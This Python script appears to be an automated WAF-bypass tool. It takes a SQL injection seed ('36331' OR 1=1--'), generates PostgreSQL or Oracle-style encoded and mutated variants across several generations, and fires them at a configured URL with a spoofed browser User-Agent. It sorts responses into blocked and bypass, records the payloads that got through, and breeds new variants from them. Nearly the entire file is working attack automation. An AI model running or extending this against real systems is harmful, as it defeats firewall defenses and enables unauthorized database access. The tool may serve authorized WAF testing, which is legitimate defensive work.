import argparse
import json
import os
import sys
import time
from collections import Counter, deque
from pathlib import Path
from urllib.parse import quote, quote_plus

try:
    import requests
except ImportError:
    print("pip install requests", file=sys.stderr)
    sys.exit(1)

ROOT = Path(__file__).resolve().parent
ML_WAF = ROOT.parent / "ml-waf"
sys.path.insert(0, str(ML_WAF))
sys.path.append(str(ROOT))

from adv_mutate import all_transforms_for_dialect, merge_adv_into_variants
from aws_variants import augment_variants
from evasion.curl_bypass_f5 import variants_f5
from pg_variants import variants_pg
from evasion.run_until_bypass import name_to_transform_key
DATA_DIR = ROOT / "data"
DEFAULT_CONFIG = ROOT / "config.json"
RESULTS_JSONL = DATA_DIR / "aws_probe_results.jsonl"
SUMMARY_JSON = DATA_DIR / "aws_probe_summary.json"
BYPASS_LEARNED_JSONL = DATA_DIR / "bypass_learned.jsonl"
BLOCKED_LEARNED_JSONL = DATA_DIR / "blocked_learned.jsonl"
OTHER_LEARNED_JSONL = DATA_DIR / "other_learned.jsonl"
LEARNED_ENCODINGS_JSON = DATA_DIR / "learned_encodings.json"
REPORT_TXT = DATA_DIR / "aws_probe_report.txt"
BYPASS_FOUND_TXT = DATA_DIR / "bypass_found.txt"


def load_learned_encodings(path: Path) -> dict:
    if not path.exists():
        return {}
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}
    trans = data.get("transforms")
    if isinstance(trans, dict):
        for v in trans.values():
            if isinstance(v, dict):
                v.setdefault("bypass", 0)
                v.setdefault("block", 0)
                v.setdefault("other", 0)
                v.setdefault("reach", 0)
    return data


def save_learned_encodings(path: Path, data: dict) -> None:
    out = {**data, "updated_ts": time.time()}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)


def bump_learned_encoding(path: Path, transform_key: str, outcome: str) -> None:
    assert outcome in ("bypass", "block", "other", "reach")
    data = load_learned_encodings(path)
    if "transforms" not in data:
        data["transforms"] = {}
    t = data["transforms"].setdefault(
        transform_key, {"bypass": 0, "block": 0, "other": 0, "reach": 0}
    )
    t.setdefault("bypass", 0)
    t.setdefault("block", 0)
    t.setdefault("other", 0)
    t.setdefault("reach", 0)
    t[outcome] = t.get(outcome, 0) + 1
    save_learned_encodings(path, data)


def _aws_sort_by_learned(variants: list[tuple[str, str]]) -> list[tuple[str, str]]:
    data = load_learned_encodings(LEARNED_ENCODINGS_JSON)
    trans = data.get("transforms", {})

    def score(item: tuple[str, str]) -> float:
        _pl, name = item
        key = name_to_transform_key(name)
        t = trans.get(key, {})
        reach = int(t.get("reach", 0) or 0)
        bl = int(t.get("block", 0) or 0)
        if reach + bl == 0:
            return 0.0
        return reach / (reach + bl)

    return sorted(variants, key=score, reverse=True)


def patch_run_until_paths() -> object:
    import evasion.run_until_bypass as rub

    rub.LEARNED_ENCODINGS_FILE = LEARNED_ENCODINGS_JSON
    rub.BYPASS_JSONL = BYPASS_LEARNED_JSONL
    rub.BLOCKED_JSONL = BLOCKED_LEARNED_JSONL
    rub.OUT_FILE = BYPASS_FOUND_TXT
    local_tp = ROOT / "data" / "transform_policy.json"
    rub.TRANSFORM_POLICY_FILE = (
        local_tp if local_tp.exists() else ML_WAF / "data" / "transform_policy.json"
    )
    rub.sort_by_learned_encodings = _aws_sort_by_learned
    return rub


def load_config(path: Path) -> dict:
    with open(path, encoding="utf-8") as f:
        c = json.load(f)
    c.setdefault("base_url", "")
    c.setdefault("inject_mode", "path")
    c.setdefault("query_param", "projectName")
    c.setdefault("raw_payload", "36331' OR 1=1--")
    c.setdefault("sql_dialect", "postgresql")
    c.setdefault("id_remap", {"from": "36331", "to": "Demo_project"})
    c.setdefault("sleep_seconds", 0.15)
    c.setdefault("max_requests", None)
    c.setdefault("extra_headers", {})
    c.setdefault("probe_mode", "variants")
    c.setdefault("max_generations", 5)
    c.setdefault("calibration", True)
    c.setdefault("id_remap_legacy", [])
    c.setdefault("aws_extra_variants", True)
    c.setdefault("aws_extra_max", 120)
    c.setdefault("adv_mutate_enabled", True)
    c.setdefault("adv_mutate_max", 80)
    c.setdefault("adv_second_layer", True)
    c.setdefault("adv_second_layer_max", 50)
    c.setdefault("repeat_per_variant", 1)
    return c


def variants_for_dialect(raw: str, dialect: str) -> list[tuple[str, str]]:
    d = (dialect or "postgresql").lower().strip()
    if d in ("postgresql", "pg", "postgres"):
        return variants_pg(raw)
    return variants_f5(raw)


def next_gen_from_base_dialect(
    base: str,
    gen: int,
    policy: dict,
    dialect: str,
    rub,
) -> list[tuple[str, str]]:
    if gen == 0:
        v = variants_for_dialect(base, dialect)
        return rub.filter_variant_list(v, policy)
    prev = next_gen_from_base_dialect(base, gen - 1, policy, dialect, rub)
    out = []
    for pl, name in prev:
        for t, tname in all_transforms_for_dialect(pl, dialect):
            if t and len(t) < 2000:
                out.append((t, f"g{gen}_{name}_{tname}"))
    out = rub.filter_variant_list(out, policy)
    out = rub.sort_by_learned_encodings(out)
    return out[:300]


def parse_remap_legacy(cfg: dict) -> list[tuple[str, str]]:
    raw = cfg.get("id_remap_legacy") or []
    out: list[tuple[str, str]] = []
    for item in raw:
        if isinstance(item, dict) and "from" in item and "to" in item:
            out.append((str(item["from"]), str(item["to"])))
    return out


def apply_remap_string(
    s: str,
    old_id: str,
    new_id: str,
    extra_pairs: list[tuple[str, str]] | None,
) -> str:
    out = s
    if old_id and new_id and old_id != new_id:
        out = out.replace(old_id, new_id)
    for a, b in extra_pairs or []:
        if a and b and a != b:
            out = out.replace(a, b)
    return out


def remap_payloads(
    variants: list[tuple[str, str]],
    old: str,
    new: str,
    extra_pairs: list[tuple[str, str]] | None = None,
) -> list[tuple[str, str]]:
    if (not old or old == new) and not extra_pairs:
        return variants
    return [
        (apply_remap_string(p, old, new, extra_pairs), name) for p, name in variants
    ]


def _looks_percent_encoded(payload: str) -> bool:
    n = min(len(payload), 256)
    i = 0
    while i < n:
        if payload[i] == "%" and i + 2 < len(payload):
            a, b = payload[i + 1], payload[i + 2]
            hexd = "0123456789abcdefABCDEF"
            if a in hexd and b in hexd:
                return True
        i += 1
    return False


def encode_segment(payload: str, *, query: bool = False) -> str:
    if payload.startswith("36331%") or payload.startswith("3%"):
        return payload
    if _looks_percent_encoded(payload):
        return payload
    if query:
        return quote_plus(payload, safe="")
    return quote(payload, safe="")


def build_url_query(base: str, param: str, payload: str) -> str:
    q = encode_segment(payload, query=True)
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}{param}={q}"


def build_url_path(base: str, payload: str) -> str:
    base = base.rstrip("/")
    seg = encode_segment(payload, query=False)
    return f"{base}/{seg}"


def is_waf_or_app_block(resp) -> bool:
    if resp.status_code in (403, 406, 429):
        return True
    t = (resp.text or "").lower()
    needles = [
        "request blocked",
        "request rejected",
        "access forbidden",
        "forbidden",
        "blocked by",
        "access denied",
        "waf",
        "not acceptable",
    ]
    for p in needles:
        if p in t:
            return True
    if '"blocked":true' in t or '"rejected":true' in t:
        return True
    return False


def is_bypass(resp) -> bool:
    if resp.status_code != 200:
        return False
    if is_waf_or_app_block(resp):
        return False
    return True


def is_app_origin_bypass(resp) -> bool:
    if resp.status_code not in (400, 422):
        return False
    body = (resp.text or "").strip()
    if not body:
        return False
    low = body.lower()
    if low.startswith("<!doctype") or "<html" in low[:500]:
        return False
    markers = (
        "invalid input syntax for type integer",
        "invalid input syntax",
        "failed to fetch project",
        '"message":"failed to fetch',
        "invalid input syntax for type",
        "nan",
    )
    return any(m in low for m in markers)


def is_ineffective_500(resp) -> bool:
    if resp.status_code != 500:
        return False
    t = (resp.text or "").lower()
    markers = (
        "utf8",
        "utf-8",
        "utf8mb4",
        "encoding",
        "invalid byte sequence",
        "incorrect string value",
        "collation",
        "character set",
        "malformed",
        "unexpected character",
        "unicode",
        "0x00",
        "invalid message format",
    )
    return any(m in t for m in markers)


OTHER_LEARNED_DETAILS = frozenset(
    {"not_found", "ineffective_500", "upstream_error"}
)


def classify_result(resp) -> tuple[str, str]:
    if is_waf_or_app_block(resp):
        return "blocked", "waf_or_edge"
    if resp.status_code in (502, 503, 504):
        return "other", "upstream_error"
    if resp.status_code == 404:
        return "other", "not_found"
    if resp.status_code == 500:
        if is_ineffective_500(resp):
            return "other", "ineffective_500"
        return "bypass", "http_500"
    if is_app_origin_bypass(resp):
        return "bypass", "origin_reached"
    if is_bypass(resp):
        return "bypass", "ok_200"
    return "other", "other"


def probe_calibration(
    base: str,
    inject_mode: str,
    query_param: str,
    literal_id: str,
    headers: dict,
    timeout: float = 20.0,
) -> dict:
    if inject_mode == "query":
        url = build_url_query(base, query_param, literal_id)
    else:
        url = build_url_path(base, literal_id)
    try:
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
    except requests.RequestException as e:
        return {
            "http_status": None,
            "url": url,
            "error": str(e)[:400],
            "hint": "request_failed",
        }
    res, detail = classify_result(r)
    blocked = res == "blocked"
    if blocked:
        hint = "waf_blocked"
    elif r.status_code == 404:
        hint = "project_not_found"
    elif r.status_code == 200 and res == "bypass":
        hint = "ok"
    elif r.status_code == 200:
        hint = "ok_nonstandard_body"
    else:
        hint = f"status_{r.status_code}_{detail}"
    return {
        "http_status": r.status_code,
        "url": url,
        "body_snip": (r.text or "")[:280].replace("\n", " "),
        "hint": hint,
        "waf_blocked": blocked,
        "classify_detail": detail,
    }


def run_full_transform_probe(
    base: str,
    inject_mode: str,
    query_param: str,
    raw: str,
    old_id: str,
    new_id: str,
    headers: dict,
    sleep_s: float,
    max_tests: int | None,
    max_gen: int,
    fout,
    extra_remap_pairs: list[tuple[str, str]] | None = None,
    aws_extra: bool = True,
    aws_extra_max: int = 120,
    sql_dialect: str = "postgresql",
    adv_mutate_enabled: bool = True,
    adv_mutate_max: int = 80,
    adv_second_layer: bool = True,
    adv_second_layer_max: int = 50,
) -> tuple[int, int, int, int, Counter[int], list[str], int]:
    rub = patch_run_until_paths()
    policy = rub.load_transform_policy()
    if policy.get("enabled") and policy.get("exclude"):
        print(
            f"Transform policy: exclude {len(policy['exclude'])} keys "
            f"(explore_rate={policy.get('explore_rate', 0.08)})"
        )
    raw_effective = apply_remap_string(raw, old_id, new_id, extra_remap_pairs)
    initial = variants_for_dialect(raw, sql_dialect)
    initial = remap_payloads(initial, old_id, new_id, extra_remap_pairs)
    if aws_extra:
        initial = augment_variants(
            initial,
            raw_effective,
            max_extra=aws_extra_max,
            sql_dialect=sql_dialect,
        )
        print(
            f"AWS extra variants: +up to {aws_extra_max} unique, queue={len(initial)} (before policy filter)",
            flush=True,
        )
    if adv_mutate_enabled:
        initial = merge_adv_into_variants(
            initial,
            raw_effective,
            DATA_DIR / "mutate_rules.json",
            mutate_max=adv_mutate_max,
            second_layer=adv_second_layer,
            second_layer_cap=adv_second_layer_max,
            sql_dialect=sql_dialect,
        )
        print(
            f"Adv mutate (ml-waf-blocked-adv + 2nd layer): queue={len(initial)} (before policy filter)",
            flush=True,
        )
    initial = rub.filter_variant_list(initial, policy)
    initial = rub.sort_by_learned_encodings(initial)
    queue = deque(initial)
    saved = rub.load_saved_bypasses()
    if saved:
        print(f"Loaded {len(saved)} saved bypass seed(s) -> spawn queue")
        for payload, name in saved:
            for t, tname in rub.spawn_from(payload, "saved", policy):
                queue.append(
                    remap_payloads([(t, tname)], old_id, new_id, extra_remap_pairs)[0]
                )
    seen: set[tuple[str, str]] = set()
    bypass_n = block_n = other_n = waf_pass_n = 0
    tested = 0
    status_hist: Counter[int] = Counter()
    report_lines: list[str] = []
    gen = 0
    bypass_count = 0
    with open(OTHER_LEARNED_JSONL, "a", encoding="utf-8") as fother:
        while True:
            if not queue:
                gen += 1
                if gen > max_gen:
                    print(f"Max generations ({max_gen}) reached.")
                    break
                refill = next_gen_from_base_dialect(
                    raw_effective, gen, policy, sql_dialect, rub
                )
                refill = remap_payloads(refill, old_id, new_id, extra_remap_pairs)
                queue.extend(refill)
                print(f"[Gen {gen}] +{len(refill)} variants (queue={len(queue)})")
                if not queue:
                    break
            if max_tests is not None and tested >= max_tests:
                print(f"Stopped: max_requests={max_tests}")
                break
            payload, name = queue.popleft()
            key = (payload[:300], name)
            if key in seen:
                continue
            seen.add(key)
            if inject_mode == "query":
                url = build_url_query(base, query_param, payload)
            else:
                url = build_url_path(base, payload)
            try:
                r = requests.get(url, headers=headers, timeout=20, allow_redirects=True)
            except requests.RequestException as e:
                tested += 1
                fout.write(
                    json.dumps(
                        {
                            "variant": name,
                            "gen": gen,
                            "http_status": None,
                            "result": "error",
                            "error": str(e)[:400],
                            "url_snip": url[:300],
                        },
                        ensure_ascii=False,
                    )
                    + "\n"
                )
                other_n += 1
                if sleep_s:
                    time.sleep(sleep_s)
                continue
            if r.status_code == 401:
                print("Stopped: HTTP 401")
                break
            tested += 1
            status_hist[r.status_code] += 1
            res, detail = classify_result(r)
            bp = res == "bypass"
            if res == "bypass":
                bypass_n += 1
            elif res == "blocked":
                block_n += 1
            else:
                other_n += 1
            if res != "blocked":
                waf_pass_n += 1
            fout.write(
                json.dumps(
                    {
                        "variant": name,
                        "gen": gen,
                        "http_status": r.status_code,
                        "result": res,
                        "result_detail": detail,
                        "waf_passed": res != "blocked",
                        "url_snip": url[:400],
                        "body_snip": (r.text or "")[:240].replace("\n", " "),
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )
            report_lines.append(
                f"{res.upper():8}  HTTP {r.status_code:3}  g{gen}  {name}  ({detail})"
            )
            if bp:
                bypass_count += 1
                rub.save_bypass(payload, name, gen)
                rub.update_learned_encoding(name_to_transform_key(name), True)
                for t, tname in rub.spawn_from(payload, f"b{bypass_count}", policy):
                    queue.append(
                        remap_payloads([(t, tname)], old_id, new_id, extra_remap_pairs)[0]
                    )
            elif res == "blocked":
                rub.save_blocked(payload, name, r.status_code)
                rub.update_learned_encoding(name_to_transform_key(name), False)
            elif detail in OTHER_LEARNED_DETAILS:
                fother.write(
                    json.dumps(
                        {
                            "payload": payload,
                            "name": name,
                            "gen": gen,
                            "status": "other",
                            "result_detail": detail,
                            "status_code": r.status_code,
                            "ts": time.time(),
                        },
                        ensure_ascii=False,
                    )
                    + "\n"
                )
                bump_learned_encoding(
                    LEARNED_ENCODINGS_JSON,
                    name_to_transform_key(name),
                    "other",
                )
            if res != "blocked":
                bump_learned_encoding(
                    LEARNED_ENCODINGS_JSON,
                    name_to_transform_key(name),
                    "reach",
                )
            print(
                f"  [{tested}] {res.upper():8}  g{gen}  {name[:52]:52}  HTTP {r.status_code}  ({detail})",
                flush=True,
            )
            if sleep_s:
                time.sleep(sleep_s)
    return bypass_n, block_n, other_n, waf_pass_n, status_hist, report_lines, tested


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="HTTP probe AWS (or any) URL using variants_f5 (oracle) or variants_pg (postgresql) + aws extras.",
    )
    ap.add_argument("--config", type=Path, default=DEFAULT_CONFIG)
    ap.add_argument("--dry-run", action="store_true", help="Print URLs only, no HTTP")
    ap.add_argument(
        "--fresh",
        action="store_true",
        help="Truncate probe jsonl + reset learned_encodings before run",
    )
    ap.add_argument(
        "--full",
        action="store_true",
        help="Full ml-waf pipeline: queue + spawn_from + generations (like run_until_bypass.py)",
    )
    ap.add_argument(
        "--repeat-per-variant",
        type=int,
        default=None,
        metavar="N",
        help="Override config repeat_per_variant: send each variant probe N times (variants mode only; improves per-variant stats).",
    )
    ns = ap.parse_args(argv)

    if not ns.config.is_file():
        print(f"Copy config.example.json to config.json: {ns.config}", file=sys.stderr)
        return 1

    cfg = load_config(ns.config)
    base = cfg["base_url"].strip()
    mode = (cfg.get("inject_mode") or "path").lower()
    param = cfg["query_param"]
    raw = cfg["raw_payload"]
    sleep_s = float(cfg["sleep_seconds"] or 0)
    max_r = cfg["max_requests"]
    max_gen_cfg = int(cfg.get("max_generations") or 5)
    probe_mode = (cfg.get("probe_mode") or "variants").lower().strip()
    if ns.full:
        probe_mode = "full"
    extra = cfg.get("extra_headers") or {}
    remap = cfg.get("id_remap") or {}
    old_id = str(remap.get("from", "36331"))
    new_id = str(remap.get("to", "Demo_project"))
    extra_pairs = parse_remap_legacy(cfg)

    if not base:
        print("base_url empty in config", file=sys.stderr)
        return 1

    if probe_mode == "full" and ns.dry_run:
        print(
            "Use --full without --dry-run (full run issues thousands of HTTP requests).",
            file=sys.stderr,
        )
        return 1

    seed = apply_remap_string(raw, old_id, new_id, extra_pairs)
    variants = variants_for_dialect(raw, cfg.get("sql_dialect", "postgresql"))
    variants = remap_payloads(variants, old_id, new_id, extra_pairs)
    if cfg.get("aws_extra_variants", True):
        variants = augment_variants(
            variants,
            seed,
            max_extra=int(cfg.get("aws_extra_max") or 120),
            sql_dialect=cfg.get("sql_dialect", "postgresql"),
        )
    if cfg.get("adv_mutate_enabled", True):
        variants = merge_adv_into_variants(
            variants,
            seed,
            DATA_DIR / "mutate_rules.json",
            mutate_max=int(cfg.get("adv_mutate_max") or 80),
            second_layer=cfg.get("adv_second_layer", True),
            second_layer_cap=int(cfg.get("adv_second_layer_max") or 50),
            sql_dialect=cfg.get("sql_dialect", "postgresql"),
        )
    if probe_mode != "full":
        variants = _aws_sort_by_learned(variants)
    if max_r is not None and probe_mode != "full":
        variants = variants[: int(max_r)]

    DATA_DIR.mkdir(parents=True, exist_ok=True)
    if ns.fresh:
        for p in (
            RESULTS_JSONL,
            BYPASS_LEARNED_JSONL,
            BLOCKED_LEARNED_JSONL,
            OTHER_LEARNED_JSONL,
            BYPASS_FOUND_TXT,
        ):
            if p.exists():
                p.write_text("", encoding="utf-8")
        with open(LEARNED_ENCODINGS_JSON, "w", encoding="utf-8") as f:
            json.dump({"transforms": {}, "updated_ts": time.time()}, f, ensure_ascii=False, indent=2)

    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        **extra,
    }

    bypass_n = 0
    block_n = 0
    other_n = 0
    tested = 0
    status_hist: Counter[int] = Counter()
    report_lines: list[str] = []

    repeat_pv = int(cfg.get("repeat_per_variant") or 1)
    if ns.repeat_per_variant is not None:
        repeat_pv = int(ns.repeat_per_variant)
    repeat_pv = max(1, repeat_pv)
    if probe_mode == "full" and repeat_pv != 1:
        print(
            "repeat_per_variant>1 applies to probe_mode=variants only; ignoring for --full",
            file=sys.stderr,
        )
        repeat_pv = 1

    print(
        f"Target: {base}  probe_mode={probe_mode}  inject={mode}  "
        f"({'param=' + param if mode == 'query' else 'path'})  "
        f"id_remap {old_id}->{new_id}  legacy={len(extra_pairs)}  "
        f"aws_extra={cfg.get('aws_extra_variants', True)}  "
        f"adv_mutate={cfg.get('adv_mutate_enabled', True)}  "
        f"sql={cfg.get('sql_dialect', 'postgresql')}  "
        f"{'max_gen=' + str(max_gen_cfg) + '  ' if probe_mode == 'full' else ''}"
        f"variants={len(variants) if probe_mode != 'full' else 'queue'}  "
        f"repeat_per_variant={repeat_pv}  sleep={sleep_s}"
    )

    learn_files = not ns.dry_run

    cal = None
    if learn_files and cfg.get("calibration", True):
        cal = probe_calibration(base, mode, param, new_id, headers)
        print(
            f"Calibration (literal id only, no SQL): HTTP {cal.get('http_status')}  "
            f"hint={cal.get('hint')}",
            flush=True,
        )
        if cal.get("hint") == "project_not_found":
            print(
                "  Baseline 404 for id_remap.to: injections often return app 404; "
                "that counts as waf_passed, not effective bypass.",
                flush=True,
            )
        if cal.get("hint") == "waf_blocked":
            print(
                "  Baseline blocked by WAF: literal project param may be denied.",
                flush=True,
            )

    waf_pass_n = 0

    if probe_mode == "full" and learn_files:
        with open(RESULTS_JSONL, "a", encoding="utf-8") as fout:
            (
                bypass_n,
                block_n,
                other_n,
                waf_pass_n,
                status_hist,
                report_lines,
                tested,
            ) = run_full_transform_probe(
                base,
                mode,
                param,
                raw,
                old_id,
                new_id,
                headers,
                sleep_s,
                int(max_r) if max_r is not None else None,
                max_gen_cfg,
                fout,
                extra_pairs,
                cfg.get("aws_extra_variants", True),
                int(cfg.get("aws_extra_max") or 120),
                cfg.get("sql_dialect", "postgresql"),
                cfg.get("adv_mutate_enabled", True),
                int(cfg.get("adv_mutate_max") or 80),
                cfg.get("adv_second_layer", True),
                int(cfg.get("adv_second_layer_max") or 50),
            )

    if probe_mode != "full":
        with open(RESULTS_JSONL, "a", encoding="utf-8") as fout, (
            open(BYPASS_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fbypass, (
            open(BLOCKED_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fblocked, (
            open(OTHER_LEARNED_JSONL, "a", encoding="utf-8")
            if learn_files
            else open(os.devnull, "w")
        ) as fother:
            for payload, name in variants:
                for trial in range(repeat_pv):
                    if mode == "query":
                        url = build_url_query(base, param, payload)
                    else:
                        url = build_url_path(base, payload)
                    if ns.dry_run:
                        if trial == 0:
                            print(url[:200] + ("..." if len(url) > 200 else ""))
                        continue
                    try:
                        r = requests.get(url, headers=headers, timeout=20, allow_redirects=True)
                    except requests.RequestException as e:
                        rec = {
                            "variant": name,
                            "gen": 0,
                            "trial": trial,
                            "trials_total": repeat_pv,
                            "http_status": None,
                            "result": "error",
                            "error": str(e)[:400],
                            "url_snip": url[:300],
                        }
                        fout.write(json.dumps(rec, ensure_ascii=False) + "\n")
                        other_n += 1
                        tested += 1
                        if sleep_s:
                            time.sleep(sleep_s)
                        continue

                    res, detail = classify_result(r)
                    bp = res == "bypass"
                    status_hist[r.status_code] += 1
                    if res == "bypass":
                        bypass_n += 1
                    elif res == "blocked":
                        block_n += 1
                    else:
                        other_n += 1
                    if res != "blocked":
                        waf_pass_n += 1

                    rec = {
                        "variant": name,
                        "gen": 0,
                        "trial": trial,
                        "trials_total": repeat_pv,
                        "http_status": r.status_code,
                        "result": res,
                        "result_detail": detail,
                        "waf_passed": res != "blocked",
                        "url_snip": url[:400],
                        "body_snip": (r.text or "")[:240].replace("\n", " "),
                    }
                    fout.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    tested += 1
                    report_lines.append(
                        f"{res.upper():8}  HTTP {r.status_code:3}  t{trial + 1}/{repeat_pv}  {name}  ({detail})"
                    )
                    if learn_files and trial == repeat_pv - 1:
                        now = time.time()
                        if bp:
                            fbypass.write(
                                json.dumps(
                                    {
                                        "payload": payload,
                                        "name": name,
                                        "gen": 0,
                                        "ts": now,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "bypass",
                            )
                        elif res == "blocked":
                            fblocked.write(
                                json.dumps(
                                    {
                                        "payload": payload,
                                        "name": name,
                                        "status": "blocked",
                                        "status_code": r.status_code,
                                        "ts": now,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "block",
                            )
                        elif detail in OTHER_LEARNED_DETAILS:
                            fother.write(
                                json.dumps(
                                    {
                                        "payload": payload,
                                        "name": name,
                                        "status": "other",
                                        "result_detail": detail,
                                        "status_code": r.status_code,
                                        "ts": now,
                                    },
                                    ensure_ascii=False,
                                )
                                + "\n"
                            )
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "other",
                            )
                        if res != "blocked":
                            bump_learned_encoding(
                                LEARNED_ENCODINGS_JSON,
                                name_to_transform_key(name),
                                "reach",
                            )
                    print(
                        f"  [{tested}] {res.upper():8}  t{trial + 1}/{repeat_pv}  {name:22}  HTTP {r.status_code}  ({detail})",
                        flush=True,
                    )

                    if sleep_s:
                        time.sleep(sleep_s)

    summary = {
        "ts": time.time(),
        "base_url": base,
        "inject_mode": mode,
        "query_param": param,
        "id_remap": {"from": old_id, "to": new_id},
        "id_remap_legacy": [{"from": a, "to": b} for a, b in extra_pairs],
        "sql_dialect": cfg.get("sql_dialect", "postgresql"),
        "raw_payload": raw,
        "repeat_per_variant": repeat_pv if probe_mode != "full" else 1,
        "variants_tested": tested if not ns.dry_run else 0,
        "bypass": bypass_n,
        "blocked": block_n,
        "waf_passed": waf_pass_n,
        "blocked_note": "blocked=WAF; bypass=200 OK, effective 500, 400/422 app errors; other_learned=404 not_found or 500 ineffective (utf8/encoding)",
        "bypass_note": "bypass=effective outcome only; waf_passed=any non-WAF denial (includes 404 app not found, 502, ineffective 500)",
        "other_or_error": other_n,
        "http_status_counts": dict(sorted(status_hist.items())),
        "calibration": cal,
        "config": str(ns.config.resolve()),
        "bypass_learned_jsonl": str(BYPASS_LEARNED_JSONL.resolve()),
        "blocked_learned_jsonl": str(BLOCKED_LEARNED_JSONL.resolve()),
        "other_learned_jsonl": str(OTHER_LEARNED_JSONL.resolve()),
        "learned_encodings_json": str(LEARNED_ENCODINGS_JSON.resolve()),
        "report_txt": str(REPORT_TXT.resolve()),
        "bypass_found_txt": str(BYPASS_FOUND_TXT.resolve()),
    }
    if not ns.dry_run:
        with open(SUMMARY_JSON, "w", encoding="utf-8") as f:
            json.dump(summary, f, ensure_ascii=False, indent=2)
        hdr = [
            "AWS probe report",
            f"bypass={bypass_n}  blocked={block_n}  waf_passed={waf_pass_n}  other={other_n}",
            "blocked = WAF/edge-style denials (403/406/429 or rejection body on 200)",
            "bypass = effective only: 200 clean, effective 500, 400/422 JSON app errors",
            "waf_passed = request not blocked by WAF (includes 404, 502, ineffective 500)",
            "other = timeouts/errors/ambiguous; 404/ineffective_500/upstream_error also in other_learned.jsonl",
            "",
        ]
        REPORT_TXT.write_text(
            "\n".join(hdr + report_lines) + "\n", encoding="utf-8"
        )
        print(
            f"\nDone. bypass={bypass_n}  blocked={block_n}  waf_passed={waf_pass_n}  "
            f"other={other_n}  HTTP codes: {dict(sorted(status_hist.items()))}"
        )
        print(f"Results: {RESULTS_JSONL.resolve()}")
        print(f"Report:  {REPORT_TXT.resolve()}")
        print(f"bypass_learned: {BYPASS_LEARNED_JSONL.resolve()}")
        print(f"blocked_learned: {BLOCKED_LEARNED_JSONL.resolve()}")
        print(f"other_learned: {OTHER_LEARNED_JSONL.resolve()}")
        print(f"learned_encodings: {LEARNED_ENCODINGS_JSON.resolve()}")
        print(f"bypass_found: {BYPASS_FOUND_TXT.resolve()}")
        print(f"Summary: {SUMMARY_JSON.resolve()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
